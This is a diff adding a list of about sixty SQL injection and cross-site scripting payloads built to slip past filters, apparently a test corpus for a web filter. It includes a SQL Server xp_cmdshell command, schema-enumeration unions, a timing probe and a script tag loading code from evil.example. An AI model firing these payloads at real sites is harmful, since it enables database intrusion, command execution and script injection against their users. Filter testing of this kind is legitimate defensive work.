@@ -1,0 +1,60 @@
+1 un/**/ion sel/**/ect 1,2
+1'/**/and/**/'1'='1
+1 union/*foo*/select 1,2
+1 /*!50000union*/ /*!50000select*/ 1
+1 uni%6Fn select 1
+1%20union%20select%201
+1%27%20or%201%3D1
+%2527 or 1=1
+1'OR'1'='1
+1' and '1'like'1
+1'	or 1=1
+1 AND 2=2
+1 and 3>2
+1 and (1)=(1)
+1 and 1 in (1)
+1 or 1=1 limit 0,1
+0' xor 1=1 #
+1'||sleep(5)||'
+1;exec('select 1')--
+1;EXEC xp_cmdshell('dir')
+1' group by 1 having 1=1 --
+1' and exists(select 1)--
+1' or exists(select * from users)--
+1 union (select 1,2)
+1 union select 1,2,3 from information_schema.tables--
+' UNION SELECT table_name FROM information_schema.tables#
+&#X3C;script&#X3E;alert(1)&#X3C;/script&#X3E;
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg onload=alert&lpar;1&rpar;>
+<img src=x onerror=alert&lpar;1&rpar;>
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+<script>\u0061lert(1)</script>
+<a href="javascript&#58;alert(1)">x</a>
+<a href="javascript&colon;alert(1)">x</a>
+<a href="java&#x0A;script:alert(1)">x</a>
+<a href="jav	ascript:alert(1)">x</a>
+<img/src=`x`/onerror=alert(1)>
+<img src=`x`onerror=alert(1)>
+<img src=x:x onerror=alert(1)>
+<img onerror=alert(1) src>
+<style onload=alert(1)></style>
+<body onpageshow=alert(1)>
+<body background=javascript:alert(1)>
+<input onauxclick=alert(1)>
+<xss id=x tabindex=1 onactivate=alert(1)></xss>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+<svg onload=alert(1)//
+<svg onload=alert(1)<!--
+<svg	onload=alert(1)>
+<object onerror=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<svg><a xlink:href=javascript:alert(1)><text x=10 y=10>click</text></a></svg>
+<math href=javascript:alert(1)>click</math>
+<script/xss src=//evil.example/x.js></script>
+<isindex type=image src=1 onerror=alert(1)>
+<img src=1 href=1 onerror="javascript:alert(1)">
+%3Csvg%2Fonload%3Dalert%281%29%3E
